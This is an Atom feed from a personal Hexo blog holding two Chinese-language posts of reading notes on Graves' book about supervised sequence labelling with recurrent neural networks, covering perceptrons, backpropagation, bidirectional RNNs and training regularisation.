<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>零の杂货铺</title>
  <subtitle>Free and Share</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://phantom0301.cc/"/>
  <updated>2017-07-12T13:31:36.193Z</updated>
  <id>http://phantom0301.cc/</id>
  
  <author>
    <name>Phantom</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>基于递归神经网络的监督序列标记（2）</title>
    <link href="http://phantom0301.cc/2017/06/26/rnntolabel2/"/>
    <id>http://phantom0301.cc/2017/06/26/rnntolabel2/</id>
    <published>2017-06-26T01:54:06.000Z</published>
    <updated>2017-07-12T13:31:36.193Z</updated>
    
    <content type="html">&lt;p&gt;机器学习小白的阅读笔记，continue~&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-神经网络&quot;&gt;&lt;a href=&quot;#0x01-神经网络&quot; class=&quot;headerlink&quot; title=&quot;0x01 神经网络&quot;&gt;&lt;/a&gt;0x01 神经网络&lt;/h2&gt;&lt;h3 id=&quot;多层感知机&quot;&gt;&lt;a href=&quot;#多层感知机&quot; class=&quot;headerlink&quot; title=&quot;多层感知机&quot;&gt;&lt;/a&gt;多层感知机&lt;/h3&gt;&lt;p&gt;人工神经网络最初是生物学大脑信息处理的一个数学模型。虽然现在很明显，人工神经网络和真正的生物学神经元没什么相似之处，但是它在模式分类领域还是很受欢迎。&lt;/p&gt;
&lt;p&gt;人工神经网络最基础的结构的是一个个小的处理单元或节点构成的网络，彼此之间的连接具有不同的权重。和生物模型相对比，节点就相当于神经元，而加权的连接就相当于神经元之间突触的强度。通过对节点的输入来激活整个网络，这个激活效果通过加权连接遍布整个网络。生物神经元的电激活其实可以看做一系列的尖锐峰值，而人工神经网络节点的激活最初是用来模拟这些峰值的平均发射率。&lt;/p&gt;
&lt;p&gt;在过去的时间里，很多特征迥异的人工神经网络模型被提出。一个显著的区别是一些人工神经网络是环状结构，而另一些模型的连接都是非环状的。环状的人工神经网络被称为反馈、递归、周期、神经网络。非环状的则被称为前馈神经网络。比较有名的前馈神经网络有感知机、径向基函数网络、科荷伦图以及霍普菲尔德网络。一个前馈神经网络广泛应用形式就是多层感知机。&lt;/p&gt;
&lt;p&gt;多层感知机中的单元按层级排列，连接从一层到另一层。输入模式在输入层这里，然后通过隐藏层传播到输出层。这一过程叫做网络的前向推算。&lt;/p&gt;
&lt;p&gt;由于多层感知机的输出只取决于当前输入，与过去或者将来无关，因此它更适合于模式识别而不是序列标记。&lt;/p&gt;
&lt;p&gt;具有特定权重的多层感知机定义了一个从输入到输出的函数。通过改变这些权重，一个多层感知机模型可以实例化成许多不同的函数。多层感知机已经被证明，如果它具有足够数量的非线性隐藏层单元，。它就可以近似于模拟紧凑输入域上的任意连续函数。由于这个原因，多层感知机被称为通用函数逼近器。&lt;/p&gt;
&lt;h4 id=&quot;前向传递&quot;&gt;&lt;a href=&quot;#前向传递&quot; class=&quot;headerlink&quot; title=&quot;前向传递&quot;&gt;&lt;/a&gt;前向传递&lt;/h4&gt;&lt;p&gt;考虑一个带有输入单元，由输入向量激活的多层感知机。第一个隐藏层中的每个单元会计算输入单元的加权和。这个隐藏层函数就会引入激活函数。神经网络有很多激活函数，最常见的选择是双曲切线。这些激活函数往往呈现S型的特点。&lt;/p&gt;
&lt;p&gt;对比双曲切线公式和逻辑S型函数，你会发现它们可以彼此推导。它们的不同在于输出范围，如果输出范围在0~1之间，应该使用逻辑函数。&lt;/p&gt;
&lt;p&gt;它们的一个很重要的特性是非线性。非线性神经网络比线性的更加强大，因为它们可以用来拟合非线性的分类边界或者非线性方程。另外，任何线性运算的组合也是线性的，这意味着具有多个线性隐藏层的多层感知机和具有单个线性隐藏层的多层感知机完全相同。这与非线性网络形成了鲜明的对比，非线性网络可以利用连续的隐藏层来重新表示输入数据，这样处理会很有用。&lt;/p&gt;
&lt;p&gt;另一个关键特性是两个函数都是可微分的，这就使得网络可以通过梯度下降来进行训练。由于它们将无限的输入域减少到有限的输出范围，神经网络激活函数有时又被称为挤压函数。&lt;/p&gt;
&lt;p&gt;在计算了第一个隐藏层激活后，依次对其余的隐藏层进行累加激活。&lt;/p&gt;
&lt;h4 id=&quot;输出层&quot;&gt;&lt;a href=&quot;#输出层&quot; class=&quot;headerlink&quot; title=&quot;输出层&quot;&gt;&lt;/a&gt;输出层&lt;/h4&gt;&lt;p&gt;输出单元激活后就给出了多层感知机的输出向量。每个单元的输出是输入和层级单元求和计算而成的。&lt;/p&gt;
&lt;p&gt;输出单元数和输出的激活函数取决于网络所要完成的任务。对于二分类问题，标准的用法是单一逻辑S函数。由于逻辑函数的取值是0和1，输出单元的激活可以被解释为输入向量属于一类的概率。&lt;/p&gt;
&lt;p&gt;这种逻辑S型的二元概率估计被称为逻辑回归或者分类评定模型。&lt;/p&gt;
&lt;p&gt;对于分类数大于2的分类问题，通常有多个输出，不同类别的输出激活函数使用&lt;br&gt;交叉熵损失函数。这就是多分类评定模型。&lt;/p&gt;
&lt;p&gt;根据上面的定义，多层感知机用于模式识别就很直观，简单的提供一个输入向量，激活网络，再选择与最活跃的输出单元对应的分类标签。&lt;/p&gt;
&lt;h4 id=&quot;损失函数&quot;&gt;&lt;a href=&quot;#损失函数&quot; class=&quot;headerlink&quot; title=&quot;损失函数&quot;&gt;&lt;/a&gt;损失函数&lt;/h4&gt;&lt;p&gt;多层感知机训练的损失函数前面已经有提及，尽管我们试图近似到完整的预测分布，但这里我们还是主要关注最大似然损失函数的生成。&lt;/p&gt;
&lt;p&gt;无论是二分类问题还是多分类问题，我们都能得到相应的损失函数替换等式。&lt;/p&gt;
&lt;h4 id=&quot;后向传递&quot;&gt;&lt;a href=&quot;#后向传递&quot; class=&quot;headerlink&quot; title=&quot;后向传递&quot;&gt;&lt;/a&gt;后向传递&lt;/h4&gt;&lt;p&gt;由于构造的多层感知机是可微的，所以它们可以用梯度下降的可微损失函数来最小化求解。梯度下降的基本思想是求出对每个网络权重的损失函数的导数，然后根据负斜率的方向调整权重。后面会讨论更多细节的部分。&lt;/p&gt;
&lt;p&gt;为了有效地计算梯度，我们使用反向传播算法来实现。这通常被称作网络的反向传递。&lt;/p&gt;
&lt;p&gt;反向传播仅仅是对偏导数链式法则的重复利用。第一步是计算出关于输出单元损失函数的导数。&lt;/p&gt;
&lt;p&gt;同样的，二分类问题和多分类问题分别有自己的偏导公式。需要记住的是，交叉熵函数层中每个单元的激活依赖于层中每个单元的网络输入。&lt;/p&gt;
&lt;p&gt;我们继续使用链式法则，在隐藏层中逆向推导。通过提出新的算子来简化表达，我们可以计算出每个网络的权重。&lt;/p&gt;
&lt;h4 id=&quot;数值梯度&quot;&gt;&lt;a href=&quot;#数值梯度&quot; class=&quot;headerlink&quot; title=&quot;数值梯度&quot;&gt;&lt;/a&gt;数值梯度&lt;/h4&gt;&lt;p&gt;在实现反向传播时，强烈建议用数值来检查权重。这可以通过增加正向和负向的扰动来实现，并且可以计算损失函数的变化。&lt;/p&gt;
&lt;p&gt;这被称为对称有限差分。注意计算函数的变量取值太小会导致数值下溢和精度下降。因此，最优值取决于给定的浮点精度。系统测试发现，10的负5次方往往结果不错。&lt;/p&gt;
&lt;p&gt;注意，数字梯度比反向传播的时间代价要高。因此，数字型微分在网络训练中是不切实际的。另外，建议始终选择体系结构最小的网络来检查它的梯度，比如只有单一隐藏层的循环神经网络。&lt;/p&gt;
&lt;h2 id=&quot;0x02-循环神经网络&quot;&gt;&lt;a href=&quot;#0x02-循环神经网络&quot; class=&quot;headerlink&quot; title=&quot;0x02 循环神经网络&quot;&gt;&lt;/a&gt;0x02 循环神经网络&lt;/h2&gt;&lt;p&gt;前面我们讨论了非环结构的前馈神经网络。如果我们允许环状连接，就可以获得循环神经网络。与前馈网络一样，已经提出了许多种类的循环神经网络，比如埃尔曼网络、乔丹网络、时延神经网络和回声状态网络。在这里，我们关注一个简单的循环神经网络，它包含一个单一的、自连接的隐藏层。&lt;/p&gt;
&lt;p&gt;虽然多层感知机和循环神经网络之间的差别看起来微不足道，但对于序列学习来说影响是深远的。多层感知机只能从输入映射到输出，而循环神经网络原则上可以从所有历史输入映射到每个输出。实际上，从多层感知机理论结果来说，循环神经网络只要有足够的隐藏单元，就可以在任意精度上近似任何可测量的序列映射。循环神经网络的关键点是循环连接允许之前输入的记忆持续存在于网络内部，从而影响网络输出。&lt;/p&gt;
&lt;h3 id=&quot;前向传递-1&quot;&gt;&lt;a href=&quot;#前向传递-1&quot; class=&quot;headerlink&quot; title=&quot;前向传递&quot;&gt;&lt;/a&gt;前向传递&lt;/h3&gt;&lt;p&gt;循环神经网络的正向传递与单一隐藏层的多层感知器类似，不同之处在于激活不只是当前时间的外部输入信号，还有之前时间步长的隐藏层激活信号。这样的话，循环神经网络的隐藏层其实就是上述两部分的叠加。对于非线性的可微激活函数，也有类似多层感知机的公式。&lt;/p&gt;
&lt;p&gt;隐藏层激活的完整序列就可以从一个时间开始，递归的使用隐藏层公式在计算。需要注意的是，这需要为隐藏单元选择一个初始值，这个初始值在任何输入序列到来之前，来表示网络的状态。这里通常用零作为初始值。但是，有研究者发现使用非零的初始值可以提高循环神经网络的稳定性和性能。&lt;/p&gt;
&lt;p&gt;输出单元的网络输入可以与隐藏单元的激活同时计算。&lt;/p&gt;
&lt;p&gt;对于序列分类和段分类任务，可以重用多层感知机中的输出激活函数，同样，损失函数也可以重用。时间分类问题就比较棘手，因为它的目标类别是未知的，但是后面会介绍一种特殊的输出层来解决循环神经网络中的时间分类问题。&lt;/p&gt;
&lt;h3 id=&quot;后向传递-1&quot;&gt;&lt;a href=&quot;#后向传递-1&quot; class=&quot;headerlink&quot; title=&quot;后向传递&quot;&gt;&lt;/a&gt;后向传递&lt;/h3&gt;&lt;p&gt;给定网络输出的可微损失函数的偏导，下一步就是求关于权重的导数。有两种已知的算法能够有效的计算权重的导数，一种是在线循环学习，一种是沿时间反向传播。我们主要观众后者，因为它更简单且更有效。&lt;/p&gt;
&lt;p&gt;和标准的反向传播算法类似，沿时反向传播由链式法则的重复应用组成。微妙之处在于，对于循环神经网络，依赖于隐藏层激活的损失函数，不仅仅影响输出层，还会在下一次时间步长里影响隐藏层。这里的计算和前向传递对应，做循环递减。最后，我们在每一步中重复使用相同的权重，再对整个序列进行求和，已得到关于网络权重的导数。&lt;/p&gt;
&lt;h3 id=&quot;展开&quot;&gt;&lt;a href=&quot;#展开&quot; class=&quot;headerlink&quot; title=&quot;展开&quot;&gt;&lt;/a&gt;展开&lt;/h3&gt;&lt;p&gt;对循环神经网络有效的可视化展示方法是沿着输入序列展开网络。需要注意的是，展开图不包含循环结构，否则，前向传递和后向传递不好定义。&lt;/p&gt;
&lt;p&gt;展开循环神经网络使得对复杂网络的更新依赖进行泛化更加容易。接下来我们会讨论网络以及多维网络和分层网络。&lt;/p&gt;
&lt;h3 id=&quot;双向网络&quot;&gt;&lt;a href=&quot;#双向网络&quot; class=&quot;headerlink&quot; title=&quot;双向网络&quot;&gt;&lt;/a&gt;双向网络&lt;/h3&gt;&lt;p&gt;对于许多序列标记任务来说，能够接触到时间点前后的上下文是有益的。比如，当进行手写字母分类时，知道字母两侧的上下文对分类是有帮助的。然而，由于标准的循环神经网络是按照时间顺序排列的，因此忽略了将来时刻的上下文。一个明显的解决方法是在网络输入中添加一个时间窗。然而，除了会增加输入权重的数量外，这种方法也会遇到和之前讨论过的时间窗方法同样的问题，即不能接受的失真和上下文始终定长。另一种尝试是在输入与目标之间引入一个延时，从而为网络提供一些将来上下文的时间。这种方法增加了网络对于失真的健壮性，但是仍然需要手动去决定上下文的范围。而且，由于这种方法需要迫使记住原始输入和它之前的上下文，这就给网络带来了不必要的负担。所以，这两种方法是无法消除过去与未来信息之间的不对等的。&lt;/p&gt;
&lt;p&gt;双向循环神经网络提供了一个更加优雅的解决方案，它的基本思想是将每个训练序列分别前馈和后馈给两个单独的隐藏层，这两层都连接到相同的输出层。这种结构使得输入序列中的每个点都提供了完整的过去和将来时刻的上下文，而不至于被循环输入所替代。双向网络在很多领域展现了它的改进效果，特别是蛋白质的二级预测和语音处理，我们发现它在序列标记方面的表现比单向循环网络要好。&lt;/p&gt;
&lt;p&gt;双向网络的前向传递和单向相同，不同之处在于两个隐藏层的传递方向正好相反，而输出层只有当两个隐藏层都处理了整个输入序列时才进行更新。&lt;/p&gt;
&lt;p&gt;同样的，后向传递也与单向相同，除了先进行所有输出层的计算，然后再反馈回两个方向相反的隐藏层。&lt;/p&gt;
&lt;h4 id=&quot;因果关系任务&quot;&gt;&lt;a href=&quot;#因果关系任务&quot; class=&quot;headerlink&quot; title=&quot;因果关系任务&quot;&gt;&lt;/a&gt;因果关系任务&lt;/h4&gt;&lt;p&gt;对双向网络提出的一个异议是它违反了因果关系。显然，对于金融预测和机器人导航这样的任务，需要访问将来输入是不可行的。当然，还有些任务是不需要考虑因果的。比较明显的例子是空间上呈现出来的输入序列，它们是不需要区分过去和将来的。这也就是为什么蛋白质预测领域广泛采用这种算法。但是，双向网络也可以用于时序任务，只要网络的输出仅依赖于输入段完整结束即可。例如，在语音和手写识别中，数据通常分割成句子、段落或对话，它们的输出标记都是需要在完整处理整个序列后再输出。此外，即使对于在线的时序任务，例如自动听写，也可以使用双向算法，只要输入过程中有一些自然的中断，比如处理数据的一部分之前暂停语音。&lt;/p&gt;
&lt;h3 id=&quot;序列雅可比矩阵&quot;&gt;&lt;a href=&quot;#序列雅可比矩阵&quot; class=&quot;headerlink&quot; title=&quot;序列雅可比矩阵&quot;&gt;&lt;/a&gt;序列雅可比矩阵&lt;/h3&gt;&lt;p&gt;前面说到，上下文信息对于序列标记十分重要。&lt;/p&gt;
&lt;p&gt;因此，我们希望有一种方法来准确的分析在特定序列中，算法是如何使用上下文的。对于循环神经网络来说，我们可以通过测量网络输出对网络输入的灵敏度来实现这一点。&lt;/p&gt;
&lt;p&gt;对于前馈神经网络，雅可比矩阵是网络输出对输入向量的偏导数矩阵。这些导数显示了输出对于输入微小变化的相对敏感度。通过在测量输入和输出变量时指定时间步长，可以将雅可比矩阵推广到循环神经网络。我们把产生的四维矩阵成为序列雅可比矩阵。&lt;/p&gt;
&lt;p&gt;这里提到用这种方法测量敏感度，但是需要注意的是，敏感度并不直接对应于上下文的重要性。比如，图像中的背景像素点，由于它的输入是一种不变的，所以它对于输入就会有很高的敏感度，但是它本身却不会提供有用的上下文信息。&lt;/p&gt;
&lt;h2 id=&quot;0x03-网络训练&quot;&gt;&lt;a href=&quot;#0x03-网络训练&quot; class=&quot;headerlink&quot; title=&quot;0x03 网络训练&quot;&gt;&lt;/a&gt;0x03 网络训练&lt;/h2&gt;&lt;p&gt;前面讨论了损失函数和梯度下降，这里我们进一步淘箩如何高效快速的训练网络。&lt;/p&gt;
&lt;h3 id=&quot;梯度下降算法&quot;&gt;&lt;a href=&quot;#梯度下降算法&quot; class=&quot;headerlink&quot; title=&quot;梯度下降算法&quot;&gt;&lt;/a&gt;梯度下降算法&lt;/h3&gt;&lt;p&gt;首先，我们需要决定如何跟随误差梯度。最简单的方法有众所周知的最速梯度下降，它是反复的在损失函数的负误差梯度上做一个固定的步骤，直到满足某个条件停止。&lt;/p&gt;
&lt;p&gt;这种方法的主要问题是容易陷入局部极小值。这可以通过增加动量项来减轻，它有效的增加了算法通过权重空间的运动惯性，从而加速收敛并从局部最小值逃逸。&lt;/p&gt;
&lt;p&gt;当这种梯度根据整个训练集定义的损失函数来计算时，权重的更新过程就被称为批学习。这和在线学习形成对比，后者是通过对个别训练示例进行权重更新。&lt;/p&gt;
&lt;p&gt;现在提出了许多复杂的梯度下降算法，例如弹性反馈算法、快速传播算法、共轭梯度算法和受限拟牛顿算法，在批量学习方面，这些方法通常优于最速梯度下降。然而，最速梯度下降更适应在线学习，因为它的每个权重更新都只需很小的步骤，可以更好的适应不断变化的梯度。&lt;/p&gt;
&lt;p&gt;在应对大量冗余和规律性的数据集时，在线学习往往比批学习更有效。此外，在线学习能够帮助我们逃离局部最小值，由于每个训练示例的损失函数是不同的。在每次通过训练集之前，随机化训练集合中数据的顺序可以进一步增强它的稳健性。&lt;/p&gt;
&lt;p&gt;最近提出的一种在线学习方法是随机元下降算法，它已经被证明可以更快的收敛和改进神经网络。&lt;/p&gt;
&lt;h3 id=&quot;泛化&quot;&gt;&lt;a href=&quot;#泛化&quot; class=&quot;headerlink&quot; title=&quot;泛化&quot;&gt;&lt;/a&gt;泛化&lt;/h3&gt;&lt;p&gt;尽管我们在训练集的算法上讨论了这么多，但是最终的目标是在测试集上能够有很好的性能表现。是否能够将训练集的性能迁移到测试集上的问题称为泛化，这对机器学习来说至关重要。通常来说，更大的训练集会有更好的泛化效果。多年来，人们提出很多改进的方法用于修正训练集，而在这里，只有三个简单的规则被使用，提前停止、输入噪声和权重噪声。&lt;/p&gt;
&lt;h4 id=&quot;提前停止&quot;&gt;&lt;a href=&quot;#提前停止&quot; class=&quot;headerlink&quot; title=&quot;提前停止&quot;&gt;&lt;/a&gt;提前停止&lt;/h4&gt;&lt;p&gt;为了提前停止，部分训练集被分出作为验证集。然后通过验证集来测试是否应该停止。最优权重值的选择也可以通过验证集来进行，通常通过选择在验证集上最小化的权重来评估测试集的性能。实践中，两种方法通常是同步进行的，在验证集上每隔一段时间对误差进行评估，并且在误差不在下降时停止训练，以此来减少训练时间。&lt;/p&gt;
&lt;p&gt;测试集不应该用于决定是否可以提前停止或者最佳权重选择。因为这是训练集间接训练的一部分。原则上，训练完成前不应该对网络进行评估。&lt;/p&gt;
&lt;p&gt;在训练过程中，误差通常会先在所有集合上减少，但是在某个点之后，当在训练集上继续减少时，误差反而会在测试集合验证集上增加，这就是过拟合。&lt;/p&gt;
&lt;p&gt;提前停止可能是最简单、使用最广泛的改进泛化的方法。但是，这样做的同时其实减少了训练集的数量，这可能导致训练性能降低，特别是在训练集数量很少的情况下。另一个问题在于，无法确定先验验证集应该有多大。需要注意的是，验证集不能作为测试集性能的准确度预测器，重要的是，过拟合在两种数据集上几乎是同时出现的。&lt;/p&gt;
&lt;h4 id=&quot;输入噪声&quot;&gt;&lt;a href=&quot;#输入噪声&quot; class=&quot;headerlink&quot; title=&quot;输入噪声&quot;&gt;&lt;/a&gt;输入噪声&lt;/h4&gt;&lt;p&gt;在网络输入中增加零均值、固定方差的高斯噪声是训练增加泛化性的一种很好的方法。期望的效果是人为的增加训练集的大小，从而产生和原始输入结果相同的新输入，从而增强泛化性。&lt;/p&gt;
&lt;p&gt;输入噪声的一个问题是很难预先确定噪声的方差应该为多少。尽管有各种各样的经验法则，最可靠的方法是在验证集上按照经验设置方差。&lt;/p&gt;
&lt;p&gt;一个更难的问题是输入扰动只有在反映真实数据中的变化才是有效的。例如，将高斯噪声添加到图像的单个像素中，不会产生明显不同的图像，因此这种方法不太可能对图像进行泛化。因此，在平滑轨迹上的独立扰动是无效的。针对特定数据集进行的输入扰动已经被证明在泛化方面是非常有效的。然而，这需要数据集的先验模型，这通常做不到。&lt;/p&gt;
&lt;p&gt;在训练时，应该为网络上的每个样例重新生成输入噪声；特别的，在网络循环通过数据时，同样的噪声不应该被重新使用。测试阶段不应该再输入噪声，这样会妨碍性能。&lt;/p&gt;
&lt;h4 id=&quot;权重噪声&quot;&gt;&lt;a href=&quot;#权重噪声&quot; class=&quot;headerlink&quot; title=&quot;权重噪声&quot;&gt;&lt;/a&gt;权重噪声&lt;/h4&gt;&lt;p&gt;另一种方法是给网络权重增加零均值、固定方差的高斯噪声。由于权重噪声或者突触噪声在网络内部是一种输入的表示，而不是输入本身，所以它可以用于任何数据类型。然而，权重噪声通常比精心设计的输入扰动效果要差，而且会带来更慢的收敛。&lt;/p&gt;
&lt;p&gt;权重噪声可以用来简化神经网络，以减少传输网络所需的信息量。直观地说，这是因为噪声降低了权重被表示出来的精度。根据奥卡姆剃刀原则，越简单的网络效果越好。&lt;/p&gt;
&lt;p&gt;和输入噪声一样，权重噪声也不应该添加到测试集评估中。&lt;/p&gt;
&lt;h3 id=&quot;输入表示&quot;&gt;&lt;a href=&quot;#输入表示&quot; class=&quot;headerlink&quot; title=&quot;输入表示&quot;&gt;&lt;/a&gt;输入表示&lt;/h3&gt;&lt;p&gt;选择一种合适的输入数据表示形式是机器学习任务中的重要部分。实际上，在某些情况下，这比算法本身更加重要。神经网络对于输入表示的稳健性表现的相对较好，例如，在语音识别中，循环神经网络对各种预处理的语音训练都很有效。&lt;/p&gt;
&lt;p&gt;对神经网络输入表示的唯一要求是，它们是完整且合理的。尽管相互无关的输入对于神经网络不是问题但会引起维度灾难，高维空间的输入将会造成过多的输入权值和较低的泛化能力。&lt;/p&gt;
&lt;p&gt;所以，输入表示是一种黑盒艺术，它的目的是使输入和目标之间的关系尽可能简单。&lt;/p&gt;
&lt;p&gt;对于所有神经网络输入数据进行的一个程序是标准化输入向量，使得训练集向量分量均值为0，标准差为1。这个过程不会改变训练集中的信息，但是通过将输入值转换成更适合于标准激活函数来提高性能。注意，测试集和验证集需要和训练集一同被标准化。&lt;/p&gt;
&lt;h3 id=&quot;权重初始化&quot;&gt;&lt;a href=&quot;#权重初始化&quot; class=&quot;headerlink&quot; title=&quot;权重初始化&quot;&gt;&lt;/a&gt;权重初始化&lt;/h3&gt;&lt;p&gt;神经网络的许多梯度下降算法要求权重拥有小而随机的初始值。我们在这里用正负1之间的平滑随机分布或者均值0、标准差0.1的高斯分布。然而，我们并没有发现我们的结果对分布或者范围非常敏感。结论就是权重初始化要重复做几次才能确定它的意义。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;机器学习小白的阅读笔记，continue~&lt;/p&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://phantom0301.cc/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="机器学习" scheme="http://phantom0301.cc/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="神经网络" scheme="http://phantom0301.cc/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    
      <category term="读书笔记" scheme="http://phantom0301.cc/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>基于递归神经网络的监督序列标记（1）</title>
    <link href="http://phantom0301.cc/2017/06/22/rnntolabel/"/>
    <id>http://phantom0301.cc/2017/06/22/rnntolabel/</id>
    <published>2017-06-22T11:52:03.000Z</published>
    <updated>2017-06-23T09:14:17.338Z</updated>
    
    <content type="html">&lt;p&gt;机器学习小白的阅读笔记，《Supervised Sequence Labelling with Recurrent Neural Networks》翻译，个人认为比较通俗易懂的相关英文文章~~&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-监督学习&quot;&gt;&lt;a href=&quot;#0x01-监督学习&quot; class=&quot;headerlink&quot; title=&quot;0x01 监督学习&quot;&gt;&lt;/a&gt;0x01 监督学习&lt;/h2&gt;&lt;p&gt;是的，我们直接从第二章开始。&lt;/p&gt;
&lt;p&gt;监督学习是使用一批带有标记的数据来进行训练的任务。这也是它和强化学习以及无监督学习的区别，强化学习是只使用一个标量奖励来训练，而无监督学习则是试图在没有标志的情况下发现整个数据的结构特点。&lt;/p&gt;
&lt;p&gt;监督学习由一组元素和标签组成训练集，输入元素组成输入空间，标签组成目标空间，另一组互斥组成测试集。也就是说训练集和测试集一起组成了我们的数据集。当然，有些时候，我们还会引入验证集这个概念，验证集来源于训练集，用来验证训练期间算法的性能，验证集也可以用来决定训练是否应终止以防止过拟合。学习的目标就是通过训练集训练模型来减小某些在测试集上的错误指标。比如回归问题，通常的错误衡量指标是模型测试集输出与测试集标签之间的平方和或者平方欧氏距离。对于那些参数化的算法来说，一般的误差最小化的方法是渐进地调整算法参数，以优化训练集上的损失函数。这种从训练集到测试集的转化就是泛化。&lt;/p&gt;
&lt;p&gt;根据监督学习任务的不同，我们需要选择不同标签的数据。&lt;/p&gt;
&lt;h2 id=&quot;0x02-模式识别&quot;&gt;&lt;a href=&quot;#0x02-模式识别&quot; class=&quot;headerlink&quot; title=&quot;0x02 模式识别&quot;&gt;&lt;/a&gt;0x02 模式识别&lt;/h2&gt;&lt;p&gt;模式识别是机器学习的一大领域，一些模式识别分类器，如多层感知机和支持向量机在研究领域被广泛使用。&lt;/p&gt;
&lt;p&gt;模式识别通常使用在非序列额数据上，但是一些实践和理论框架依然可以被借鉴到序列数据案例中。因此，先回顾一下这些框架。&lt;/p&gt;
&lt;p&gt;对于监督模式识别的输入空间，我们需要找到一个函数关系，使得输入空间可以映射到目标空间，也就是说把输入的向量数据映射到标签值上。这时，我们就可以用错误率来衡量分类器的性能。&lt;/p&gt;
&lt;h3 id=&quot;概率分类&quot;&gt;&lt;a href=&quot;#概率分类&quot; class=&quot;headerlink&quot; title=&quot;概率分类&quot;&gt;&lt;/a&gt;概率分类&lt;/h3&gt;&lt;p&gt;一部分分类器通过判别函数输出分类标签，与之对应的，我们还可以选择概率分类来输出一个概率值。使用概率分类的好处在于我们衡量分类问题不再是单一的0或1，这丰富了我们对输出结果的认知，我们可以知道同样是标签1,被判别为1和1的输入之间彼此还有不同。另一个好处是，概率分类使得我们可以合并分类器结果。&lt;/p&gt;
&lt;h3 id=&quot;训练概率分类器&quot;&gt;&lt;a href=&quot;#训练概率分类器&quot; class=&quot;headerlink&quot; title=&quot;训练概率分类器&quot;&gt;&lt;/a&gt;训练概率分类器&lt;/h3&gt;&lt;p&gt;如果把一个分类器看成是输入和参数对于分类标签的条件概率分布，我们可以得到一个概率公式，通过贝叶斯法则，我们可以推导出一个新的公式。&lt;/p&gt;
&lt;p&gt;再通过对于参数的积分，我们可以得到一个关于输入的后验分布。&lt;/p&gt;
&lt;p&gt;由于真实的参数是高维的，所以我们通过数学推导得到的公式并不好计算。因此我们引入一个叫最大先验近似的参数来简化这个积分公式。&lt;/p&gt;
&lt;p&gt;在最大先验近似参数的计算公式中，有一个奥卡姆因子，用来改变一些权重，也就是说对于复杂的参数，我们认为它出现的可能性很低。当我们去掉这个因子，就得到最大似然参数。&lt;/p&gt;
&lt;p&gt;到这里，我们就可以摆脱真实参数，而去讨论我们得到的更好用来计算的参数。&lt;/p&gt;
&lt;h5 id=&quot;最大似然损失函数&quot;&gt;&lt;a href=&quot;#最大似然损失函数&quot; class=&quot;headerlink&quot; title=&quot;最大似然损失函数&quot;&gt;&lt;/a&gt;最大似然损失函数&lt;/h5&gt;&lt;p&gt;这个函数用来找到最大似然参数，它是分类器对输入空间预测的负自然对数和。由于对数的单调递增性，最小化这个负对数和，相当于在求真数的最大值。&lt;/p&gt;
&lt;p&gt;而这个函数的导数就是网络权重。&lt;/p&gt;
&lt;h3 id=&quot;生成方法与判别方法&quot;&gt;&lt;a href=&quot;#生成方法与判别方法&quot; class=&quot;headerlink&quot; title=&quot;生成方法与判别方法&quot;&gt;&lt;/a&gt;生成方法与判别方法&lt;/h3&gt;&lt;p&gt;通过模型对输入得到一个概率，这就是判别方法。但是，有时我们有需要根据分类条件密度，再通过贝叶斯法则结合先验概率来找到后验值，这种方法就是生成。生成方法可以独立训练每个类别，而判别的方法一旦有新的类别加入就需要重新训练模型。但是，判别方法会有更好的分类结果，因为它的目标就是找到合适的分类边界。&lt;/p&gt;
&lt;p&gt;这里主要关注判别序列标记。当然，也会讨论广为人知的生成方法——隐马尔科夫模型。&lt;/p&gt;
&lt;h2 id=&quot;0x03-序列标记&quot;&gt;&lt;a href=&quot;#0x03-序列标记&quot; class=&quot;headerlink&quot; title=&quot;0x03 序列标记&quot;&gt;&lt;/a&gt;0x03 序列标记&lt;/h2&gt;&lt;p&gt;序列标记的目标是从固定字母表中提取标签序列分配给输入数据序列。比如通过一段手写图片或者声音序列得到它们的内容标记。虽然此类任务通常在和时间序列有关，但也存在于非时序序列的情况，比如蛋白质二级结构的预测。&lt;/p&gt;
&lt;p&gt;如果假设序列是独立同分布的，那么我们就可以使用模式分类的基本框架，用序列代替模式。在实践中，这种假设可能并不完全正确，比如一些对于序列边界的讨论。进一步，我们假设标签序列与输入序列一样长，那么我们就有一个简单的识别任务。&lt;/p&gt;
&lt;p&gt;某些情况下，我们可以应用一些附加的约束在标签序列上。这可能会影响算法所做的标签选择以及对性能的衡量。下面几节描述了三种序列标记任务，时间分类、段分类、序列分类。逐步放宽对应于输入和标签序列之间关系的假设，并讨论适用于每个序列的算法和算法性能。&lt;/p&gt;
&lt;h3 id=&quot;序列分类&quot;&gt;&lt;a href=&quot;#序列分类&quot; class=&quot;headerlink&quot; title=&quot;序列分类&quot;&gt;&lt;/a&gt;序列分类&lt;/h3&gt;&lt;p&gt;最极端的例子是标签序列长度为1。也就是说每一个输入序列对应一个单一分类。这包括单个的语音识别和手写识别。这类任务的特点是在分类前可以先处理整个序列。&lt;/p&gt;
&lt;p&gt;如果输入序列是定长的或者容易处理成定长的格式，它们就可以转换成输入向量来进行模式识别。这里面有名的测试集是MNIST。卷积神经网络和支持向量机等大量方法都被应用于它的识别。&lt;/p&gt;
&lt;p&gt;和模式识别相似，我们使用序列错误率来衡量一个分类器的性能。&lt;/p&gt;
&lt;h3 id=&quot;段分类&quot;&gt;&lt;a href=&quot;#段分类&quot; class=&quot;headerlink&quot; title=&quot;段分类&quot;&gt;&lt;/a&gt;段分类&lt;/h3&gt;&lt;p&gt;段分类指的是目标序列由多个标签组成的分类任务，但是标签的位置是预先知道的。段分类常见于自然语言处理和生物信息学等领域中，这些领域的输入是离散的且容易被分段。当然，如果能够完成繁琐的手工分割操作，它也可以被用在音频和图像识别领域。&lt;/p&gt;
